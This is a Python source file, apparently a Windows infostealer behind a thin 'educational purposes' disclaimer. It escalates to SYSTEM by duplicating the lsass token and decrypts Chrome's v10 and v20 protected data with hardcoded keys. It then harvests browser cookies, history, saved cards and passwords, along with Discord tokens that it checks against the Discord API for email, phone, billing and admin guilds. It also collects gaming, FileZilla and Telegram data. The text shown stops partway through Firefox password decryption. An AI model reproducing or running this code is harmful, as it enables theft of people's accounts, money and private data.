#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
#
# This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3

import base64
import tempfile
from datetime import datetime, timezone
import glob
import time
import ctypes
import ctypes.wintypes as wt
import hashlib
import json
import os
import random
import re
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from getpass import getuser

try:
    from Cryptodome.Cipher import AES, DES3, ChaCha20_Poly1305
    from Cryptodome.Util.Padding import unpad
except ImportError:
    from Crypto.Cipher import AES, DES3, ChaCha20_Poly1305
    from Crypto.Util.Padding import unpad

try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
except ImportError:
    requests = None

LOCAL = os.environ.get("LOCALAPPDATA", "")
ROAM = os.environ.get("APPDATA", "")
HOME = os.environ.get("USERPROFILE", os.path.expanduser("~"))
PROG = os.environ.get("ProgramData", r"C:\ProgramData")
CNW = 0x08000000
_TMPDIR = None


def _run_dir():
    global _TMPDIR
    if _TMPDIR is None:
        _TMPDIR = tempfile.mkdtemp(prefix="zzg_")
    return _TMPDIR


def create_temp(_dir=None):
    d = _dir or _run_dir()
    os.makedirs(d, exist_ok=True)
    name = "".join(random.SystemRandom().choice(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(12))
    return os.path.join(d, name)


def _copy_db(path):
    if not os.path.isfile(path):
        return None
    tmp = create_temp()
    try:
        shutil.copy2(path, tmp)
        return tmp
    except Exception:
        return None


class _DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


def dpapi_unprotect(blob):
    if not blob:
        raise ValueError("empty blob")
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
    except ImportError:
        pass

    crypt32 = ctypes.windll.crypt32
    kernel = ctypes.windll.kernel32
    buf = ctypes.create_string_buffer(bytes(blob), len(blob))
    din = _DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    dout = _DATA_BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(din), None, None, None, None, 0,
                                      ctypes.byref(dout)):
        raise OSError("CryptUnprotectData failed")
    try:
        return ctypes.string_at(dout.pbData, dout.cbData)
    finally:
        kernel.LocalFree(dout.pbData)


def _proc_names():
    names = []
    if psutil is not None:
        for p in psutil.process_iter(["name"]):
            try:
                if p.info["name"]:
                    names.append(p.info["name"].lower())
            except Exception:
                pass
        return names
    try:
        out = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True,
                             text=True, creationflags=CNW).stdout
        for line in out.splitlines():
            m = re.match(r'"([^"]+)"', line)
            if m:
                names.append(m.group(1).lower())
    except Exception:
        pass
    return names


def _pid_of(name):
    if psutil is not None:
        for p in psutil.process_iter(["name", "pid"]):
            try:
                if p.info["name"] and p.info["name"].lower() == name.lower():
                    return p.info["pid"]
            except Exception:
                pass
        return None
    out = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + name, "/FO", "CSV", "/NH"],
                         capture_output=True, text=True, creationflags=CNW).stdout
    m = re.search(r'"([^"]+)","(\d+)"', out)
    return int(m.group(2)) if m else None


def _enable_privilege(name="SeDebugPrivilege"):
    try:
        advapi = ctypes.windll.advapi32
        kernel = ctypes.windll.kernel32

        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", wt.DWORD),
                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]

        h = wt.HANDLE()
        if not advapi.OpenProcessToken(kernel.GetCurrentProcess(),
                                       wt.DWORD(0x0020 | 0x0008), ctypes.byref(h)):
            return False
        luid = LUID()
        advapi.LookupPrivilegeValueW(None, name, ctypes.byref(luid))
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = 0x0002
        advapi.AdjustTokenPrivileges(h, False, ctypes.byref(tp), 0, None, None)
        kernel.CloseHandle(h)
        return True
    except Exception:
        return False


def _lsass_token():
    try:
        _enable_privilege()
        kernel = ctypes.windll.kernel32
        advapi = ctypes.windll.advapi32
        pid = _pid_of("lsass.exe")
        if not pid:
            return None
        hproc = kernel.OpenProcess(0x1000, False, pid)
        if not hproc:
            return None
        htok = wt.HANDLE()
        if not advapi.OpenProcessToken(hproc, 0x0002, ctypes.byref(htok)):
            kernel.CloseHandle(hproc)
            return None
        hdup = wt.HANDLE()
        ok = advapi.DuplicateTokenEx(htok, 0xF01FF, None, 2, 2, ctypes.byref(hdup))
        kernel.CloseHandle(htok)
        kernel.CloseHandle(hproc)
        return hdup if ok else None
    except Exception:
        return None


def as_system(func, default=None):
    hdup = _lsass_token()
    if not hdup:
        try:
            return func()
        except Exception:
            return default
    try:
        ctypes.windll.advapi32.ImpersonateLoggedOnUser(hdup)
        return func()
    except Exception:
        return default
    finally:
        ctypes.windll.advapi32.RevertToSelf()
        ctypes.windll.kernel32.CloseHandle(hdup)


def http_json(url, headers=None, timeout=15):
    headers = headers or {}
    if requests is not None:
        try:
            r = requests.get(url, headers=headers, timeout=timeout)
            return r.status_code, r.json()
        except Exception:
            return 0, {}
    import urllib.request
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8", "replace"))
    except Exception as e:
        return getattr(e, "code", 0), {}


BROWSERS = {
    "Chrome":       os.path.join(LOCAL, r"Google\Chrome\User Data"),
    "Chrome SxS":   os.path.join(LOCAL, r"Google\Chrome SxS\User Data"),
    "Edge":         os.path.join(LOCAL, r"Microsoft\Edge\User Data"),
    "Brave":        os.path.join(LOCAL, r"BraveSoftware\Brave-Browser\User Data"),
    "Vivaldi":      os.path.join(LOCAL, r"Vivaldi\User Data"),
    "Yandex":       os.path.join(LOCAL, r"Yandex\YandexBrowser\User Data"),
    "Chromium":     os.path.join(LOCAL, r"Chromium\User Data"),
    "Kometa":       os.path.join(LOCAL, r"Kometa\User Data"),
    "Orbitum":      os.path.join(LOCAL, r"Orbitum\User Data"),
    "CentBrowser":  os.path.join(LOCAL, r"CentBrowser\User Data"),
    "7Star":        os.path.join(LOCAL, r"7Star\7Star\User Data"),
    "Sputnik":      os.path.join(LOCAL, r"Sputnik\Sputnik\User Data"),
    "Epic Privacy": os.path.join(LOCAL, r"Epic Privacy Browser\User Data"),
    "Uran":         os.path.join(LOCAL, r"uCozMedia\Uran\User Data"),
    "Iridium":      os.path.join(LOCAL, r"Iridium\User Data"),
    "Amigo":        os.path.join(LOCAL, r"Amigo\User Data"),
    "Torch":        os.path.join(LOCAL, r"Torch\User Data"),
    "Opera":        os.path.join(ROAM, r"Opera Software\Opera Stable"),
    "Opera GX":     os.path.join(ROAM, r"Opera Software\Opera GX Stable"),
}

DISCORD_DIRS = [
    os.path.join(ROAM, "discord"),
    os.path.join(ROAM, "Discord"),
    os.path.join(ROAM, "Lightcord"),
    os.path.join(ROAM, "discordcanary"),
    os.path.join(ROAM, "discordptb"),
    os.path.join(ROAM, "discorddevelopment"),
    os.path.join(LOCAL, "Discord"),
    os.path.join(LOCAL, "discord"),
    os.path.join(LOCAL, "Programs", "Discord"),
]

DISCORD_EXES = ["discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe"]


def kill_discord():
    if psutil is not None:
        for p in list(psutil.process_iter(["name"])):
            try:
                if (p.info.get("name") or "").lower() in DISCORD_EXES:
                    p.kill()
            except Exception:
                pass
    else:
        for exe in DISCORD_EXES:
            subprocess.run(["taskkill", "/f", "/im", exe], capture_output=True, creationflags=CNW)
    time.sleep(1)


def _safe_leveldb(src):
    tmp = create_temp()
    os.makedirs(tmp, exist_ok=True)
    try:
        for fn in os.listdir(src):
            p = os.path.join(src, fn)
            if not os.path.isfile(p):
                continue
            try:
                shutil.copyfile(p, os.path.join(tmp, fn))
            except Exception:
                pass
    except Exception:
        pass
    return tmp


def _scan_file(path, store, label, mkey=None, vkey=None):
    try:
        if os.path.getsize(path) > 40 * 1024 * 1024:
            return 0
    except Exception:
        return 0
    raw = _read_text(path)
    if not raw:
        return 0
    hits = 0
    for m in ENC_RE.findall(raw):
        try:
            tok = decrypt_value(base64.b64decode(m), mkey, vkey)
            if tok:
                _add_token(store, tok, label)
                hits += 1
        except Exception:
            pass
    for m in TOKEN_RE.findall(raw):
        _add_token(store, m, label)
        hits += 1
    return hits


def _scan_dir(path, store, label, mkey=None, vkey=None, deep=False):
    total = 0
    try:
        names = os.listdir(path)
    except Exception:
        return 0
    for fn in names:
        p = os.path.join(path, fn)
        if os.path.isdir(p):
            if deep:
                total += _scan_dir(p, store, label, mkey, vkey, deep)
            continue
        total += _scan_file(p, store, label, mkey, vkey)
    return total

BROWSER_EXES = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "vivaldi.exe",
                "msedge.exe", "yandex.exe", "chromium.exe", "iridium.exe", "torch.exe"]


def profiles(root):
    if not os.path.isdir(root):
        return []
    out = []
    for e in os.listdir(root):
        p = os.path.join(root, e)
        if os.path.isdir(p) and (e == "Default" or e.startswith("Profile ")
                                 or e in ("Guest Profile", "System Profile")):
            out.append(e)
    return out


def browser_targets():
    for name, root in BROWSERS.items():
        if not os.path.isdir(root):
            continue
        profs = profiles(root)
        if not profs:
            yield name, "Default", root, root
        else:
            for prof in profs:
                yield name, prof, root, os.path.join(root, prof)


def kill_browsers():
    if psutil is not None:
        for p in list(psutil.process_iter(["name"])):
            try:
                if p.info["name"] and p.info["name"].lower() in BROWSER_EXES:
                    p.kill()
            except Exception:
                pass
    else:
        for exe in BROWSER_EXES:
            subprocess.run(["taskkill", "/f", "/im", exe], capture_output=True, creationflags=CNW)
    time.sleep(1)


_V20_AES = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
_V20_CHACHA = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
_V20_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")

_key_cache = {}


def master_key(root):
    if root in _key_cache:
        return _key_cache[root]
    key = None
    try:
        with open(os.path.join(root, "Local State"), "r", encoding="utf-8") as f:
            ls = json.load(f)
        blob = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        key = dpapi_unprotect(blob)
    except Exception:
        key = None
    _key_cache[root] = key
    return key


def cng_decrypt(data):
    ncrypt = ctypes.windll.NCRYPT
    hprov = wt.HANDLE()
    if ncrypt.NCryptOpenStorageProvider(ctypes.byref(hprov),
                                        "Microsoft Software Key Storage Provider", 0) != 0:
        raise OSError("NCryptOpenStorageProvider")
    hkey = wt.HANDLE()
    try:
        if ncrypt.NCryptOpenKey(hprov, ctypes.byref(hkey), "Google Chromekey1", 0, 0) != 0:
            raise OSError("NCryptOpenKey")
        buf = ctypes.create_string_buffer(bytes(data), len(data))
        needed = wt.DWORD(0)
        flags = 0x40
        if ncrypt.NCryptDecrypt(hkey, buf, len(data), None, None, 0,
                                ctypes.byref(needed), flags) != 0:
            raise OSError("NCryptDecrypt(size)")
        out = ctypes.create_string_buffer(needed.value)
        if ncrypt.NCryptDecrypt(hkey, buf, len(data), None, out, needed.value,
                                ctypes.byref(needed), flags) != 0:
            raise OSError("NCryptDecrypt")
        return out.raw[:needed.value]
    finally:
        if hkey:
            ncrypt.NCryptFreeObject(hkey)
        ncrypt.NCryptFreeObject(hprov)


def derive_v20_key(blob):
    off = 0
    hlen = struct.unpack_from("<I", blob, off)[0]
    off += 4 + hlen
    struct.unpack_from("<I", blob, off)[0]
    off += 4
    flag = blob[off]
    off += 1
    if flag in (1, 2):
        iv = blob[off:off + 12]; off += 12
        ct = blob[off:off + 32]; off += 32
        tag = blob[off:off + 16]
        if flag == 1:
            return AES.new(_V20_AES, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag)
        return ChaCha20_Poly1305.new(key=_V20_CHACHA, nonce=iv).decrypt_and_verify(ct, tag)
    if flag == 3:
        enc_key = blob[off:off + 32]; off += 32
        iv = blob[off:off + 12]; off += 12
        ct = blob[off:off + 32]; off += 32
        tag = blob[off:off + 16]
        dec = as_system(lambda: cng_decrypt(enc_key))
        key = bytes(a ^ b for a, b in zip(dec, _V20_XOR))
        return AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag)
    return None


def v20_key(root):
    ck = root + "|v20"
    if ck in _key_cache:
        return _key_cache[ck]
    key = None
    try:
        with open(os.path.join(root, "Local State"), "r", encoding="utf-8") as f:
            ls = json.load(f)
        raw = base64.b64decode(ls["os_crypt"]["app_bound_encrypted_key"])
        if raw[:4] != b"APPB":
            raise ValueError("bad prefix")
        enc = raw[4:]
        stage1 = as_system(lambda: dpapi_unprotect(enc))
        stage2 = dpapi_unprotect(stage1)
        key = derive_v20_key(stage2)
    except Exception:
        key = None
    _key_cache[ck] = key
    return key


def _best_text(a, b):
    def score(s):
        if not s:
            return -1
        return sum(1 for c in s if 32 <= ord(c) < 127) / len(s)
    return a if score(a) >= score(b) else b


def decrypt_value(blob, mkey, vkey=None):
    if not blob:
        return ""
    try:
        if blob[:3] == b"v10" and mkey:
            iv, payload = blob[3:15], blob[15:]
            return AES.new(mkey, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode("utf-8", "replace")
        if blob[:3] == b"v20" and vkey:
            iv, payload = blob[3:15], blob[15:]
            pt = AES.new(vkey, AES.MODE_GCM, iv).decrypt(payload)[:-16]
            stripped = pt[32:].decode("utf-8", "replace")
            full = pt.decode("utf-8", "replace")
            return _best_text(stripped, full)
    except Exception:
        pass
    try:
        return dpapi_unprotect(blob).decode("utf-8", "replace")
    except Exception:
        return ""


def _cookie_db(pdir):
    for rel in (("Network", "Cookies"), ("Cookies",)):
        p = os.path.join(pdir, *rel)
        if os.path.isfile(p):
            return p
    return None


def _netscape(domain, path, secure, expires, name, value):
    sub = "TRUE" if domain.startswith(".") else "FALSE"
    sec = "TRUE" if secure else "FALSE"
    try:
        exp = int(int(expires) / 1000000 - 11644473600) if expires else 0
    except Exception:
        exp = 0
    if exp < 0:
        exp = 0
    return "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(domain, sub, path, sec, exp, name, value)


def grab_cookies(kill=False):
    if kill:
        kill_browsers()
    out = []

    for name, prof, root, pdir in browser_targets():
        db = _cookie_db(pdir)
        if not db:
            continue
        tmp = _copy_db(db)
        if not tmp:
            continue
        mkey = master_key(root)
        vkey = v20_key(root)
        try:
            conn = sqlite3.connect(tmp)
            rows = conn.execute(
                "SELECT host_key, name, path, is_secure, expires_utc, encrypted_value "
                "FROM cookies").fetchall()
            conn.close()
        except Exception:
            rows = []
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
        if not rows:
            continue
        out.append("\n[{} :: {}]\n".format(name, prof))
        for host, cname, cpath, secure, expires, enc in rows:
            val = decrypt_value(enc, mkey, vkey)
            if not host or not cname or val == "":
                continue
            out.append(_netscape(host, cpath or "/", secure, expires, cname, val))

    ff = os.path.join(ROAM, r"Mozilla\Firefox\Profiles")
    if os.path.isdir(ff):
        for prof in os.listdir(ff):
            db = os.path.join(ff, prof, "cookies.sqlite")
            if not os.path.isfile(db):
                continue
            tmp = _copy_db(db)
            if not tmp:
                continue
            try:
                conn = sqlite3.connect(tmp)
                rows = conn.execute(
                    "SELECT host, name, path, isSecure, expiry, value FROM moz_cookies").fetchall()
                conn.close()
            except Exception:
                rows = []
            finally:
                try:
                    os.remove(tmp)
                except Exception:
                    pass
            if not rows:
                continue
            out.append("\n[Firefox :: {}]\n".format(prof))
            for host, cname, cpath, secure, expiry, val in rows:
                if not host or not cname:
                    continue
                out.append("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                    host, "TRUE" if host.startswith(".") else "FALSE",
                    cpath or "/", "TRUE" if secure else "FALSE",
                    int(expiry) if expiry else 0, cname, val))

    return "".join(out) or "no cookies found"


def _chrome_time(v):
    try:
        return datetime.fromtimestamp(int(v) / 1000000 - 11644473600, timezone.utc).strftime("%Y-%m-%d %H:%M")
    except Exception:
        return "?"


def grab_history(limit=400):
    out = []

    for name, prof, root, pdir in browser_targets():
        db = os.path.join(pdir, "History")
        if not os.path.isfile(db):
            continue
        tmp = _copy_db(db)
        if not tmp:
            continue
        try:
            conn = sqlite3.connect(tmp)
            rows = conn.execute(
                "SELECT url, title, visit_count, last_visit_time FROM urls "
                "ORDER BY last_visit_time DESC LIMIT ?", (limit,)).fetchall()
            conn.close()
        except Exception:
            rows = []
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
        if not rows:
            continue
        out.append("\n[{} :: {}]\n".format(name, prof))
        for url, title, count, last in rows:
            out.append("{} | {} | x{} | {}\n".format(_chrome_time(last), url, count, (title or "")[:90]))

    ff = os.path.join(ROAM, r"Mozilla\Firefox\Profiles")
    if os.path.isdir(ff):
        for prof in os.listdir(ff):
            db = os.path.join(ff, prof, "places.sqlite")
            if not os.path.isfile(db):
                continue
            tmp = _copy_db(db)
            if not tmp:
                continue
            try:
                conn = sqlite3.connect(tmp)
                rows = conn.execute(
                    "SELECT url, title, visit_count, last_visit_date FROM moz_places "
                    "WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT ?",
                    (limit,)).fetchall()
                conn.close()
            except Exception:
                rows = []
            finally:
                try:
                    os.remove(tmp)
                except Exception:
                    pass
            if not rows:
                continue
            out.append("\n[Firefox :: {}]\n".format(prof))
            for url, title, count, last in rows:
                out.append("{} | {} | x{} | {}\n".format(_chrome_time(last), url, count, (title or "")[:90]))

    return "".join(out) or "no history found"


def grab_cards():
    out = []

    for name, prof, root, pdir in browser_targets():
        db = os.path.join(pdir, "Web Data")
        if not os.path.isfile(db):
            continue
        tmp = _copy_db(db)
        if not tmp:
            continue
        mkey = master_key(root)
        vkey = v20_key(root)
        try:
            conn = sqlite3.connect(tmp)
            rows = conn.execute(
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted "
                "FROM credit_cards").fetchall()
            conn.close()
        except Exception:
            rows = []
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
        if not rows:
            continue
        out.append("\n[{} :: {}]\n".format(name, prof))
        for holder, month, year, enc in rows:
            number = decrypt_value(enc, mkey, vkey)
            out.append("holder : {}\nnumber : {}\nexp    : {}/{}\n".format(
                holder or "-", number or "-", month or "-", year or "-"))

    return "".join(out) or "no cards found"


def _read(path, size=200000):
    try:
        with open(path, "rb") as f:
            return f.read(size).decode("utf-8", "ignore")
    except Exception:
        return ""


def _glob_lines(pattern, keep=60):
    hits = []
    for f in glob.glob(pattern):
        hits.append(f)
        if len(hits) >= keep:
            break
    return hits


def grab_games():
    out = []

    steam = [r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam",
             os.path.join(ROAM, "Steam"), r"D:\Steam", r"E:\Steam"]
    for base in steam:
        if not os.path.isdir(base):
            continue
        vdf = os.path.join(base, "config", "loginusers.vdf")
        if os.path.isfile(vdf):
            out.append("\n[Steam :: loginusers.vdf]\n" + _read(vdf)[:8000] + "\n")
        cfg = os.path.join(base, "config", "config.vdf")
        if os.path.isfile(cfg):
            data = _read(cfg)
            found = re.findall(r'"(?:SteamID|accountname|PersonaName)"\s+"([^"]+)"', data)
            if found:
                out.append("[Steam :: config.vdf]\n" + "\n".join(sorted(set(found))[:40]) + "\n")
        ssfn = glob.glob(os.path.join(base, "ssfn*"))
        if ssfn:
            out.append("[Steam :: ssfn files]\n" + "\n".join(os.path.basename(s) for s in ssfn) + "\n")

    mc = os.path.join(ROAM, ".minecraft", "launcher_profiles.json")
    if os.path.isfile(mc):
        out.append("\n[Minecraft]\n" + _read(mc)[:8000] + "\n")

    riot = os.path.join(LOCAL, r"Riot Games\Riot Client\Data")
    if os.path.isdir(riot):
        for f in ("RiotGamesPrivateSettings.yaml", "RiotClientSettings.yaml"):
            p = os.path.join(riot, f)
            if os.path.isfile(p):
                out.append("\n[Riot :: {}]\n".format(f) + _read(p)[:6000] + "\n")

    bnet = os.path.join(ROAM, "Battle.net", "Battle.net.config")
    if os.path.isfile(bnet):
        out.append("\n[Battle.net]\n" + _read(bnet)[:6000] + "\n")

    epic = os.path.join(LOCAL, r"EpicGamesLauncher\Saved\Config\Windows")
    if os.path.isdir(epic):
        for f in os.listdir(epic):
            if f.lower().endswith(".ini"):
                out.append("\n[Epic :: {}]\n".format(f) + _read(os.path.join(epic, f))[:4000] + "\n")

    ubis = [os.path.join(LOCAL, r"Ubisoft Game Launcher\settings.yml"),
            os.path.join(ROAM, r"Ubisoft\UbisoftConnect\settings.yml")]
    for p in ubis:
        if os.path.isfile(p):
            out.append("\n[Ubisoft]\n" + _read(p)[:4000] + "\n")

    ea = os.path.join(LOCAL, r"Electronic Arts\EA Desktop")
    if os.path.isdir(ea):
        out.append("\n[EA Desktop]\n" + "\n".join(os.listdir(ea)[:40]) + "\n")

    gog = os.path.join(PROG, r"GOG.com\Galaxy\storage")
    if os.path.isdir(gog):
        out.append("\n[GOG Galaxy]\n" + "\n".join(os.listdir(gog)[:40]) + "\n")

    tg = os.path.join(ROAM, "Telegram Desktop", "tdata")
    if os.path.isdir(tg):
        out.append("\n[Telegram Desktop]\ntdata present: {}\n".format(tg))

    fz = os.path.join(ROAM, "FileZilla")
    if os.path.isdir(fz):
        for f in ("recentservers.xml", "sitemanager.xml", "filezilla.xml"):
            p = os.path.join(fz, f)
            if os.path.isfile(p):
                out.append("\n[FileZilla :: {}]\n".format(f) + _read(p)[:6000] + "\n")

    return "".join(out) or "no accounts found"


TOKEN_RE = re.compile(r"(mfa\.[\w-]{80,90}|[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110})")
ENC_RE = re.compile(r"dQw4w9WgXcQ:([^\"']*)")


def _read_text(path):
    try:
        with open(path, "rb") as f:
            return f.read().decode("utf-8", "ignore")
    except Exception:
        return ""


def _add_token(store, token, source):
    if not token:
        return
    token = token.strip()
    if token in store:
        return
    store[token] = source


def _collect_tokens():
    store = {}

    for name, prof, root, ls in _leveldb_dirs():
        label = "{} ({})".format(name, prof)
        mkey = master_key(root)
        vkey = v20_key(root)
        tmp = _safe_leveldb(ls)
        _scan_dir(tmp, store, label, mkey, vkey)
        shutil.rmtree(tmp, ignore_errors=True)

    for d in DISCORD_DIRS:
        if not os.path.isdir(d):
            continue
        label = os.path.basename(d)
        mkey = master_key(d)
        vkey = v20_key(d)
        for sub in ("Local Storage/leveldb", "Local Storage", "Session Storage"):
            p = os.path.join(d, *sub.split("/"))
            if os.path.isdir(p):
                _scan_dir(p, store, label, mkey, vkey)
        idx = os.path.join(d, "IndexedDB")
        if os.path.isdir(idx):
            _scan_dir(idx, store, label, mkey, vkey, deep=True)

    ff = os.path.join(ROAM, r"Mozilla\Firefox\Profiles")
    if os.path.isdir(ff):
        for base, _, files in os.walk(ff):
            for fn in files:
                if not fn.endswith((".sqlite", ".sqlite-wal")):
                    continue
                _scan_file(os.path.join(base, fn), store, "Firefox")

    return store


def _leveldb_dirs():
    for name, root in BROWSERS.items():
        if not os.path.isdir(root):
            continue
        profs = profiles(root)
        if profs:
            for prof in profs:
                ls = os.path.join(root, prof, "Local Storage", "leveldb")
                if os.path.isdir(ls):
                    yield name, prof, root, ls
        else:
            ls = os.path.join(root, "Local Storage", "leveldb")
            if os.path.isdir(ls):
                yield name, "Default", root, ls


def _api(token, path, tries=2):
    return http_json("https://discord.com/api/v10" + path,
                     {"Authorization": token, "User-Agent": "Mozilla/5.0"})[1]


def _account(token, source):
    me = _api(token, "/users/@me")
    if not isinstance(me, dict) or "id" not in me:
        return None

    uid = me["id"]
    disc = me.get("discriminator") or "0"
    username = me["username"] if disc in ("0", None) else "{}#{}".format(me["username"], disc)

    billing = _api(token, "/users/@me/billing/payment-sources")
    if not isinstance(billing, list):
        billing = []
    methods = []
    for m in billing:
        methods.append({1: "Credit Card", 2: "PayPal"}.get(m.get("type"), "Unknown"))

    nitro = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(
        me.get("premium_type"), "None")

    guilds = _api(token, "/users/@me/guilds?with_counts=true")
    hq = []
    if isinstance(guilds, list):
        for g in guilds:
            try:
                admin = int(g["permissions"]) & 0x8 != 0
            except Exception:
                admin = False
            if not admin or g.get("approximate_member_count", 0) < 100:
                continue
            inv = _api(token, "/guilds/{}/invites".format(g["id"]))
            link = "https://discord.gg/" + inv[0]["code"] if isinstance(inv, list) and inv else "-"
            hq.append("{} ({}) | owner={} | members={} | {}".format(
                g.get("name"), g["id"], bool(g.get("owner")),
                g.get("approximate_member_count"), link))
            if len(hq) >= 8:
                break

    gifts = _api(token, "/users/@me/outbound-promotions/codes")
    codes = []
    if isinstance(gifts, list):
        for c in gifts:
            codes.append("{} -> {}".format(
                (c.get("promotion") or {}).get("outbound_title"), c.get("code")))

    return {
        "user": username,
        "id": uid,
        "token": token,
        "email": me.get("email"),
        "phone": me.get("phone"),
        "mfa": me.get("mfa_enabled"),
        "nitro": nitro,
        "billing": ", ".join(methods) or "None",
        "verified": me.get("verified"),
        "guilds": hq,
        "gifts": codes,
        "source": source,
    }


def _accounts():
    store = _collect_tokens()
    seen, out = set(), []
    for token, src in store.items():
        acc = _account(token, src)
        if not acc or acc["id"] in seen:
            continue
        seen.add(acc["id"])
        out.append(acc)
    return out


def grab_discord(kill=False):
    if kill:
        kill_browsers()
        kill_discord()
    accs = _accounts()
    if not accs:
        return "no valid tokens"
    blocks = []
    for a in accs:
        lines = [
            "  source    : {}".format(a["source"]),
            "  user      : {} ({})".format(a["user"], a["id"]),
            "  token     : {}".format(a["token"]),
            "  email     : {}".format(a["email"]),
            "  phone     : {}".format(a["phone"]),
            "  mfa       : {}".format(a["mfa"]),
            "  nitro     : {}".format(a["nitro"]),
            "  billing   : {}".format(a["billing"]),
            "  verified  : {}".format(a["verified"]),
        ]
        if a["guilds"]:
            lines.append("  hq guilds :")
            lines += ["    " + g for g in a["guilds"]]
        if a["gifts"]:
            lines.append("  gifts     :")
            lines += ["    " + c for c in a["gifts"]]
        blocks.append("\n".join(lines))
    return "\n\n".join(blocks)


def grab_discord_json(kill=False):
    if kill:
        kill_browsers()
        kill_discord()
    return json.dumps(_accounts(), ensure_ascii=False)


def grab_discord_diag():
    kill_browsers()
    lines = []
    store = _collect_tokens()
    lines.append("candidates : {}".format(len(store)))
    for token, src in list(store.items())[:40]:
        me = _api(token, "/users/@me")
        ok = isinstance(me, dict) and me.get("id")
        lines.append("{} | {} | {}".format("VALID" if ok else "BAD", src, token[:40]))
    lines.append("")
    lines.append("paths:")
    for name, root in BROWSERS.items():
        if os.path.isdir(root):
            lines.append("  browser " + root)
    for d in DISCORD_DIRS:
        if os.path.isdir(d):
            lines.append("  app     " + d)
    return "\n".join(lines)


def grab_discord_json():
    return json.dumps(_accounts(), ensure_ascii=False)


def _login_db(pdir):
    p = os.path.join(pdir, "Login Data")
    return p if os.path.isfile(p) else None


def _chromium_passwords():
    out = []
    for name, prof, root, pdir in browser_targets():
        db = _login_db(pdir)
        if not db:
            continue
        tmp = _copy_db(db)
        if not tmp:
            continue
        mkey = master_key(root)
        vkey = v20_key(root)
        try:
            conn = sqlite3.connect(tmp)
            rows = conn.execute(
                "SELECT origin_url, action_url, username_value, password_value "
                "FROM logins").fetchall()
            conn.close()
        except Exception:
            rows = []
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
        if not rows:
            continue
        out.append("\n[{} :: {}]\n".format(name, prof))
        for origin, action, user, pwd in rows:
            pw = decrypt_value(pwd, mkey, vkey)
            if not user and not pw:
                continue
            out.append("{}\n    user: {}\n    pass: {}\n".format(
                action or origin, user, pw))
    return out


def _der_objects(data):
    objs, i, n = [], 0, len(data)
    while i < n:
        tag = data[i]; i += 1
        if i >= n:
            break
        length = data[i]; i += 1
        if length & 0x80:
            k = length & 0x7F
            if k == 0 or i + k > n:
                break
            length = int.from_bytes(data[i:i + k], "big")
            i += k
        if i + length > n:
            break
        objs.append((tag, data[i:i + length]))
        i += length
    return objs


def _der_octets(data):
    out = []

    def walk(d):
        for tag, val in _der_objects(d):
            if tag == 0x04:
                out.append(val)
            elif tag == 0x30:
                walk(val)

    walk(data)
    return out


def _ff_keys(seed):
    base = hashlib.sha1(seed).digest()
    alt = hashlib.sha1(base).digest()
    cands = [base + base[:4], base + alt[:4], alt[:4] + base, base[:16], base + b"\x00" * 4]
    out, seen = [], set()
    for c in cands:
        c = c[:24]
        if len(c) in (16, 24) and c not in seen:
            seen.add(c)
            out.append(c)
    return out


def _pk11_decrypt(master, b64):
    try:
        der = base64.b64decode(b64)
    except Exception:
        return None
    parts = _der_octets(der)
    if len(parts) < 2:
        return None
    iv8 = parts[-2][:8]
    iv16 = parts[-2][:16]
    ct = parts[-1]
    for seed in (master + iv8, master + iv16, master):
        for key in _ff_keys(seed):
            try:
                pt = unpad(DES3.new(key, DES3.MODE_CBC, iv8).decrypt(ct), 8)
                txt = pt.decode("utf-8")
